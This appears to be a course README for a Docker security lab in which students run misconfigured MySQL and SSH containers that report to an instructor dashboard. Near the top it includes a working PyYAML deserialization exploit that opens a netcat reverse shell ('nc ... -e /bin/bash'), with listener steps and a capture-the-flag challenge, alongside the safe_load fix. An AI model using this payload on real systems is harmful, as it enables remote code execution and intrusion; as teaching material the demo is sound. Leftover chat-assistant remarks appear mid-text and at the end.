# 🛡️ MySQL Security Visibility Lab

A Docker-based security visibility lab where students run intentionally misconfigured MySQL containers that report their status to an instructor-run dashboard.

---

### 🧠 **Educational Exploit Demo – PyYAML RCE Example**

```python
import yaml

# 🚨 Malicious YAML payload that exploits yaml.load()
malicious_payload = """
!!python/object/apply:os.system
args: ["nc host.docker.internal 4444 -e /bin/bash"]
"""

# ⚠️ This line is vulnerable — executes arbitrary code
yaml.load(malicious_payload, Loader=yaml.UnsafeLoader)

print("Payload sent. Check your listener for a shell!")
```

---

### 🧑‍🏫 What to Teach From This

- **PyYAML’s `load()`** function can deserialize YAML that *instantiates real Python objects*.
- If the input is **untrusted** (like from a web form or upload), this leads to **remote code execution**.
- Using tags like `!!python/object/apply:os.system`, an attacker can run **any shell command**.
- In this case, it launches a **reverse shell** using `netcat`.

---

### 🛡️ The Fix

Just one change makes this safe:

```python
yaml.safe_load(malicious_payload)
```

This will raise an error and **prevent the code from running**, because `safe_load()` only allows basic YAML types (lists, strings, dicts).

---

### 🧪 Suggested Workflow for Students

1. **Run a listener** on their host machine:

   ```bash
   nc -lvnp 4444
   ```

2. **Run this Python script** in the vulnerable container.

3. **Catch the shell** and explore the container.

---

### 🏁 Bonus Challenge Idea

Tell students:
> There's a `flag.txt` hidden somewhere. Exploit the app and retrieve it.

Then drop this in your Dockerfile:

```Dockerfile
RUN echo "CTF{well-done-you-rce-d-the-box}" > /flag.txt
```

They’ll need to:
- Exploit the YAML deserialization
- Gain a shell
- Find and `cat /flag.txt`

---

Let me know if you want this wrapped up into a `student_exploit_demo.py` file in the container too! 👨‍🎓📁
---

## 🚀 Quick Start for Students

Follow these steps to get your client running!

### 1️⃣ Clone the Repo

```bash
git clone https://github.com/delveccj/CSC180_Spring2024.git
cd CSC180/CSC180_Spring2024/red_blue/client
```

### 2️⃣ Edit Your Configuration

Open `config.json` and update it with:

- Your instructor’s IP address
- Your team name

```json
{
  "instructor_ip": "192.168.1.104",
  "instructor_port": 5001,
  "team_name": "YOUR_NAME_HERE"
}
```

> 💡 This tells your client where to send status updates.

---

### 3️⃣ Build the Client Stack

```bash
docker-compose build
```

### 4️⃣ Run the Client Stack

```bash
docker-compose up
```

Watch your client log output — it will send status every 30 seconds.

---

### 5️⃣ Shut It Down When You're Done

```bash
docker-compose down
```

This stops and removes your containers.

---

## 📦 Space Check & Cleanup

Docker can take up a lot of disk space! Here's how to check and clean up.

### Check Disk Usage

```bash
df -h
```

Look at the `/` or `/var/lib/docker` mount to see free space.

### Clean Up Docker Stuff

**Remove stopped containers, old networks, build cache, and dangling images:**

```bash
docker system prune -f
```

**Remove all unused images (frees up lots of space):**

```bash
docker image prune -a -f
```

**Remove unused volumes (optional):**

```bash
docker volume prune -f
```

---

## 🛠️ Architecture Overview

```plaintext
          🧑‍🏫 Instructor Machine (Server with UI)
              ┌────────────────────────────────────────┐
              │ Web UI: Shows all clients' status live │
              │ Status: MySQL ✔ | Remote ✔ | SSH ✔      │
              └────────────────────────────────────────┘
                      ▲             ▲             ▲
               JSON POSTs     every 30 sec    From each client
                      ▲             ▲
    ┌─────────────────┴─────────────┴────────────────────┐
    │                                                    │
 🧑‍🎓 Student A                                 🧑‍🎓 Student B
 ┌──────────────┐                            ┌──────────────┐
 │ mysql        │  ← exposed port 3306       │ mysql        │
 │ ssh (port 22)│  ← insecure access         │ ssh (port 22)│
 │ client.py    │  → reports status          │ client.py    │
 └──────────────┘                            └──────────────┘
```

---

## ✅ What the Client Reports

Each student’s client sends:

```json
{
  "team": "Team_Alpha",
  "mysql_up": true,
  "remote_connections": true,
  "ssh_open": true
}
```

- ✅ `mysql_up`: Is MySQL responding locally?
- 🔍 `remote_connections`: Are non-local IPs connected?
- 🔓 `ssh_open`: Is port 22 reachable (remote SSH access)?

---

## 📊 The Dashboard

The instructor runs a Flask server that displays a live table showing:

| Team        | IP Address     | MySQL Status | Remote Conn | SSH Status | Last Update |
|-------------|----------------|--------------|--------------|-------------|--------------|
| Team_Alpha  | 10.0.0.42      | 🟢 UP         | 🔴 REMOTE     | 🔴 EXPOSED   | 12:31:47     |

- **Green** = Secure
- **Red** = Vulnerable or exposed
- Auto-refreshes every 5 seconds

---

## 🧠 Learning Goals

Students learn to:

- Use Docker Compose to build real service stacks
- Understand how internal services get exposed externally
- Identify when a system is vulnerable to remote MySQL or SSH access
- Monitor service health, remote access, and attacker visibility

---

## 💡 Bonus Ideas for Extension

- Add attacker containers to probe open ports
- Capture `.bash_history` or leave flags in `/root/flag.txt`
- Introduce logging and alerting
- Gamify it with scoring

---

## 🧼 Reminder for Students

Before you leave, run:

```bash
docker-compose down
docker system prune -f
```

And double-check disk usage with:

```bash
df -h
```

Keep your machine clean — just like your MySQL configs 😄

---

Built with ☕, 🐳, and a healthy dose of red vs green flags.
```

---

Let me know if you want a version of this with markdown badges, or if you want to auto-detect instructor IP from an env var or script. But this version is clean, accurate, and reflects **everything you've built today.** 🏁
